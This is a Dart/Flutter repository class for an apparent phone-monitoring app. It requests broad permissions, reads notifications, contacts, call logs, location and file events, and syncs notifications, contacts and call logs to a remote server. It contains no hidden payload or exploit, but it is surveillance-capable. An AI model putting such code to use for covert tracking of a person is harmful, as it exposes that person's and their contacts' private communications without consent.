import 'package:dartz/dartz.dart';
import '../../../../core/errors/exceptions.dart';
import '../../../../core/errors/failures.dart';
import '../../../../core/services/notification_service.dart';
import '../../../../core/services/contacts_service.dart';
import '../../../../core/services/call_log_service.dart';
import '../../../../core/services/location_service.dart';
import '../../../../core/services/file_monitor_service.dart';
import '../../domain/entities/monitoring_entities.dart';
import '../../domain/repositories/monitoring_repository.dart';
import '../../domain/repositories/permission_type.dart';
import '../datasources/monitoring_remote_datasource.dart';

class MonitoringRepositoryImpl implements MonitoringRepository {
  final MonitoringRemoteDataSource remoteDataSource;
  final NotificationService notificationService;
  final ContactsService contactsService;
  final CallLogService callLogService;
  final LocationService locationService;
  final FileMonitorService fileMonitorService;

  MonitoringRepositoryImpl({
    required this.remoteDataSource,
    required this.notificationService,
    required this.contactsService,
    required this.callLogService,
    required this.locationService,
    required this.fileMonitorService,
  });

  @override
  Future<Either<Failure, void>> startMonitoring() async {
    try {
      // Request all necessary permissions
      await _requestAllPermissions();
      return const Right(null);
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  Future<void> _requestAllPermissions() async {
    await notificationService.requestPermission();
    await contactsService.hasPermission();
    await callLogService.hasPermission();
    await locationService.requestPermission();
    await fileMonitorService.hasPermission();
  }

  @override
  Future<Either<Failure, void>> stopMonitoring() async {
    try {
      return const Right(null);
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  @override
  Future<Either<Failure, void>> syncData() async {
    try {
      // Sync notifications
      final notifications = await notificationService.getNotifications();
      if (notifications.isNotEmpty) {
        await remoteDataSource.syncNotifications(notifications);
      }

      // Sync contacts
      final contacts = await contactsService.getContacts();
      if (contacts.isNotEmpty) {
        await remoteDataSource.syncContacts(contacts);
      }

      // Sync call logs
      final callLogs = await callLogService.getCallLogs();
      if (callLogs.isNotEmpty) {
        await remoteDataSource.syncCallLogs(callLogs);
      }

      return const Right(null);
    } on ServerException catch (e) {
      return Left(ServerFailure(e.message));
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  @override
  Future<Either<Failure, List<NotificationEntity>>> getNotifications() async {
    try {
      final notifications = await notificationService.getNotifications();
      return Right(notifications
          .map((e) => NotificationEntity(
                id: e['id'] ?? '',
                appName: e['appName'] ?? '',
                appPackage: e['appPackage'] ?? '',
                title: e['title'] ?? '',
                content: e['content'] ?? '',
                timestamp: DateTime.tryParse(e['timestamp'] ?? '') ?? DateTime.now(),
                isRead: e['isRead'] ?? false,
              ))
          .toList());
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  @override
  Future<Either<Failure, List<ContactEntity>>> getContacts() async {
    try {
      final contacts = await contactsService.getContacts();
      return Right(contacts
          .map((e) => ContactEntity(
                id: e['id'] ?? '',
                name: e['name'] ?? '',
                phoneNumbers: List<String>.from(e['phoneNumbers'] ?? []),
                emails: List<String>.from(e['emails'] ?? []),
                photoUri: e['photoUri'],
              ))
          .toList());
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  @override
  Future<Either<Failure, List<CallLogEntity>>> getCallLogs() async {
    try {
      final callLogs = await callLogService.getCallLogs();
      return Right(callLogs
          .map((e) => CallLogEntity(
                id: e['id'] ?? '',
                contactName: e['contactName'] ?? '',
                phoneNumber: e['phoneNumber'] ?? '',
                type: _parseCallType(e['type']),
                duration: e['duration'] ?? 0,
                timestamp: DateTime.tryParse(e['timestamp'] ?? '') ?? DateTime.now(),
              ))
          .toList());
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  CallType _parseCallType(String? type) {
    switch (type?.toLowerCase()) {
      case 'incoming':
        return CallType.incoming;
      case 'outgoing':
        return CallType.outgoing;
      default:
        return CallType.missed;
    }
  }

  @override
  Future<Either<Failure, List<LocationEntity>>> getLocations() async {
    try {
      final position = await locationService.getCurrentLocation();
      if (position == null) {
        return const Right([]);
      }
      return Right([
        LocationEntity(
          id: DateTime.now().millisecondsSinceEpoch.toString(),
          latitude: position.latitude,
          longitude: position.longitude,
          altitude: position.altitude,
          accuracy: position.accuracy,
          speed: position.speed,
          timestamp: DateTime.now(),
        ),
      ]);
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  @override
  Future<Either<Failure, List<FileEventEntity>>> getFileEvents() async {
    try {
      final files = await fileMonitorService.getRecentFiles();
      return Right(files
          .map((e) => FileEventEntity(
                id: e['id'] ?? '',
                filePath: e['filePath'] ?? '',
                fileName: e['fileName'] ?? '',
                operation: _parseFileOperation(e['operation']),
                fileSize: e['fileSize'],
                mimeType: e['mimeType'],
                timestamp: DateTime.tryParse(e['timestamp'] ?? '') ?? DateTime.now(),
              ))
          .toList());
    } catch (e) {
      return Left(ServerFailure(e.toString()));
    }
  }

  FileOperation _parseFileOperation(String? operation) {
    switch (operation?.toLowerCase()) {
      case 'create':
        return FileOperation.create;
      case 'delete':
        return FileOperation.delete;
      default:
        return FileOperation.modify;
    }
  }

  @override
  Future<Either<Failure, bool>> requestPermission(PermissionType type) async {
    try {
      switch (type) {
        case PermissionType.notifications:
          return Right(await notificationService.requestPermission());
        case PermissionType.contacts:
          return Right(await contactsService.hasPermission());
        case PermissionType.callLogs:
          return Right(await callLogService.hasPermission());
        case PermissionType.location:
          return Right(await locationService.requestPermission());
        case PermissionType.storage:
          return Right(await fileMonitorService.hasPermission());
      }
    } catch (e) {
      return Left(PermissionFailure(e.toString()));
    }
  }
}